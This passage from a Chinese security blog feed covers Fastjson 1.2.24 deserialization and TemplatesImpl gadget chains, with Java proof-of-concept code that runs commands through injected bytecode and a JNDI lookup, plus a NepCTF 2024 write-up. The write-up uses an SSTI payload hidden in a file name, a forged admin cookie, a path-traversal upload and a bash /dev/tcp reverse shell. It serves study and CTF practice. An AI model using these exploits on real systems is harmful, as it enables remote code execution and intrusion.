class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用的是<code>JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField)</code>这种格式的<code>parseObject</code></p><p>或则是<code>JSON.parse(payload,Feature.SupportNonPublicField);</code>这种格式</p><h3 id="利用方法"><a class="markdownIt-Anchor" href="#利用方法"></a> 利用方法</h3><h4 id="templatsimpl链"><a class="markdownIt-Anchor" href="#templatsimpl链"></a> TemplatsImpl链</h4><p>利用链</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">JSON</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseObject-&gt;DefaultJSONParser</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseObject-&gt;JavaObjectDeserializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:deserialze-&gt;DefaultJSONParser</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parse-&gt;DefaultJSONParser</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseObject-&gt;JavaBeanDeserializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:deserialze-&gt;JavaBeanDeserializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:parseField-&gt;DefaultFieldDeserializer-&gt;parseField-&gt;FieldDeserializer-&gt;setValue-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getOutputProperties</span><br></code></pre></td></tr></table></figure><p>后面就是接TemplatsImpl利用链了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        CtClass cc=pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        CtConstructor ctConstructor=cc.makeClassInitializer();<br>        ctConstructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code=cc.toBytecode();<br>        String code_base64= Base64.encodeBase64String(code);<br>        <span class="hljs-keyword">final</span> String NASTY_CLASS=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String payload=<br>                <span class="hljs-string">&quot;&#123;\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,&quot;</span> + <span class="hljs-string">&quot;\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + code_base64 + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                        <span class="hljs-string">&quot;&#x27;_name&#x27;:&#x27;aaa&#x27;,&#x27;&quot;</span> +<br>                        <span class="hljs-string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="hljs-string">&quot;\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +<br>                        <span class="hljs-string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;<br>        ParserConfig config=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserConfig</span>();<br>        Object obj= JSON.parseObject(payload,Object.class,config, Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/akka1/p/16138460.html">https://www.cnblogs.com/akka1/p/16138460.html</a></p><h4 id="jdbcrowsetimpl链"><a class="markdownIt-Anchor" href="#jdbcrowsetimpl链"></a> JdbcRowSetImpl链</h4><p>这条链就是利用Fastjson反序列化导致<a href="/2024/09/24/JNDI%E6%B3%A8%E5%85%A5">JNDI注入</a>从而命令执行，需要能出网</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">PoC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/RCE\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(PoC);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_43263451/article/details/125862793">https://blog.csdn.net/weixin_43263451/article/details/125862793</a></p><p>fastjson多种利用方式</p><p><a href="https://www.cnblogs.com/nice0e3/p/14776043.html">https://www.cnblogs.com/nice0e3/p/14776043.html</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImpl利用链详解</title>
    <link href="/2024/08/29/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2024/08/29/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p><code>TemplatesImep</code>利用链的核心就是可以恶意加载字节码，因为该类中存在一个内部类<code>TransletClassLoader</code>，该类继承了<code>ClassLoader</code>并且重写了<code>loadClass</code>，我们可以通过这个类加载器进行加载字节码,然后初始化执行恶意代码。</p><p>TemplatesImep利用链其实就是CC3的一些扩展。</p><h3 id="链子1"><a class="markdownIt-Anchor" href="#链子1"></a> 链子1</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplateImplTest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance-&gt;TemplateImplTest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineTransletClasses-&gt;TransletClassLoader</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineClass</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateImplTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault(); <span class="hljs-comment">//创建ClassPool</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;TemplateImplTest&quot;</span>); <span class="hljs-comment">//创建一个新类</span><br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class)); <span class="hljs-comment">//添加一个类路径</span><br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">//将生成的类设置为 AbstractTranslet 的子类。</span><br>        CtConstructor ctConstructor=cc.makeClassInitializer(); <span class="hljs-comment">//创建类初始化器</span><br>        ctConstructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="hljs-comment">//插入代码</span><br>        cc.writeFile(); <span class="hljs-comment">//写入文件</span><br><br>        <span class="hljs-type">byte</span>[] code=Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\CTFtmp\\demo\\TemplateImplTest.class&quot;</span>));<span class="hljs-comment">//从文件读取</span><br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Method defineTransletClasses=templates.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getTransletInstance&quot;</span>);<br>        defineTransletClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        defineTransletClasses.invoke(templates);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String field,Object arg )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Field f= obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj,arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateImplTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;      <br>        <span class="hljs-comment">//不写文件直接给变量</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        CtClass cc=pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        CtConstructor ctConstructor=cc.makeClassInitializer();<br>        ctConstructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes=cc.toBytecode();<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;fru1ts&quot;</span>);<br>        Method defineTransletClasses=templates.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getTransletInstance&quot;</span>);<br>        defineTransletClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        defineTransletClasses.invoke(templates);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String field,Object arg )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Field f= obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj,arg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="链子2"><a class="markdownIt-Anchor" href="#链子2"></a> 链子2</h3><p>链子1延长而已</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:newTransformer-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineTransletClasses-&gt;TransletClassLoader</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineClass</span><br></code></pre></td></tr></table></figure><h3 id="链子3"><a class="markdownIt-Anchor" href="#链子3"></a> 链子3</h3><p>链子2再延长而已</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getOutputProperties-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:newTransformer-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:getTransletInstance-&gt;TemplatesImpl</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineTransletClasses-&gt;TransletClassLoader</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:defineClass</span><br></code></pre></td></tr></table></figure><p>不过getOutputProperties是public可以直接调用，不需要反射。</p><h3 id="tempatesimpl触发任意getter"><a class="markdownIt-Anchor" href="#tempatesimpl触发任意getter"></a> TempatesImpl触发任意getter</h3><p><strong>这里的getter是指以get开头的方法</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">ObjectMapper</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:writeValueAsString-&gt;ObjectMapper</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_writeValueAndClose-&gt;DefaultSerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeValue-&gt;DefaultSerializerProvider</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:_serialize-&gt;BeanSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serialize-&gt;BeanSerializer</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeFields-&gt;BeanPropertyWriter</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:serializeAsField</span><br></code></pre></td></tr></table></figure><p>BeanSerializer::serializeFields会遍历所有getter，每个get都会调用<code>BeanPropertyWriter::serializeAsField</code>通过<code> this._accessorMethod.invoke(bean, (Object[])null);</code>调用getter。</p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><em><a href="https://www.cnblogs.com/seizer/p/17064102.html">TemplatesImpl利用链分析 - seizer-zyx - 博客园 (cnblogs.com)</a></em></p>]]></content>
    
    
    <categories>
      
      <category>JAVA反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024NepCTF</title>
    <link href="/2024/08/26/2024NepCTF/"/>
    <url>/2024/08/26/2024NepCTF/</url>
    
    <content type="html"><![CDATA[<p>没错，冲着贴纸来的！</p><img src="/2024/08/26/2024NepCTF/1.jpg" class=""><h1 id="nepmagic-checkin"><a class="markdownIt-Anchor" href="#nepmagic-checkin"></a> NepMagic —— CheckIn</h1><p>集齐所有碎片通过就o了</p><p>NepCTF{50c505f4-2700-11ef-ad49-00155d5e2505}</p><h1 id="nepdouble"><a class="markdownIt-Anchor" href="#nepdouble"></a> NepDouble</h1><img src="/2024/08/26/2024NepCTF/2.jpg" class=""><p>这里明显存在SSTI，而且文件名可控</p><p>创建一个名为</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__init__.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read().py</span><br></code></pre></td></tr></table></figure><p>的文件，然后压缩成zip上传</p><img src="/2024/08/26/2024NepCTF/3.jpg" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;https://neptune-55198.nepctf.lemonprefect.cn/&quot;</span><br>file=&#123;<span class="hljs-string">&quot;tp_file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:/CTFtmp/test.zip&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)&#125;<br>r=requests.post(url=url,files=file)<br><span class="hljs-built_in">print</span>(r.text)<br><br><br><span class="hljs-comment">#&lt;a href=&quot;/cat?file=f35a84497a3683d7a0f11aa112ed07fc/NepCTF&#123;89cf3517-065a-45f3-b9e9-3b8e2721d22b&#125;.py&quot;&gt;flag&#x27;).read()&#125;&#125;.py&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><h1 id="蹦蹦炸弹boom_it"><a class="markdownIt-Anchor" href="#蹦蹦炸弹boom_it"></a> 蹦蹦炸弹（boom_it）</h1><img src="/2024/08/26/2024NepCTF/4.jpg" class=""><p>secret_key已经知道，可以伪造admin</p><img src="/2024/08/26/2024NepCTF/5.jpg" class=""><p>改一下然后本地启动，得到admin的cookie</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">session</span><span class="hljs-operator">=</span>eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br></code></pre></td></tr></table></figure><p>用这个cookie访问admin/dashboard，上传文件lock.txt</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/admin/</span>dashboard HTTP/<span class="hljs-number">1.1</span><br>Host: neptune-<span class="hljs-number">54601</span>.nepctf.lemonprefect.cn<br>Sec-Ch-Ua: <span class="hljs-string">&quot;-Not.A/Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;102&quot;</span><br>Sec-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br>Sec-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-regexp">/102.0.5005.63 Safari/</span><span class="hljs-number">537.36</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>avif,image<span class="hljs-regexp">/webp,image/</span>apng,*<span class="hljs-regexp">/*;q=0.8,application/</span>signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>Sec-Fetch-Site: none<br>Sec-Fetch-Mode: navigate<br>Sec-Fetch-User: ?<span class="hljs-number">1</span><br>Sec-Fetch-Dest: document<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Connection: close<br>Cookie:session=eyJhZG1pbl9sb2dnZWRfaW4iOnRydWV9.ZslOZw.KFv2PjH93EEhNdmCRUW1Nx2vPe4<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD61WFa2qL1y9KPPS<br>Content-Length: <span class="hljs-number">198</span><br><br>------WebKitFormBoundaryD61WFa2qL1y9KPPS<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>;filename=<span class="hljs-string">&quot;../../lock.txt&quot;</span><br>Content-Type:multipart/form-data<br><br><span class="hljs-number">111</span><br>------WebKitFormBoundaryD61WFa2qL1y9KPPS--<br><br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /admin/dashboard?cmd=bash+-c+&#x27;bash+-i+&gt;%<span class="hljs-number">26</span>+/dev/tcp/vps/port+&lt;%<span class="hljs-number">261</span>&#x27; HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: neptune-<span class="hljs-number">54601</span>.nepctf.lemonprefect.cn<br><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot;-Not.A/Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;102&quot;</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">102</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5005</span>.<span class="hljs-number">63</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span 